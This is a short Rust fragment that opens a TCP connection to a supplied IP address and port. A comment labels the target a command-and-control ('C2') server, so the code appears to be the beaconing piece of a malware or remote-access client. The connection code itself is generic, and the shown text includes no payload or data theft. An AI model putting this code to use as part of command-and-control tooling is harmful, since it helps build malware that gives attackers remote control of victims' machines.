use std::net::{IpAddr, TcpStream, SocketAddr};

// Connect to C2 Server
pub fn init_connection(ip: IpAddr, port: u16) -> TcpStream {
    let mut stream = TcpStream::connect(SocketAddr::from((ip, port))).unwrap();
    return stream;
}
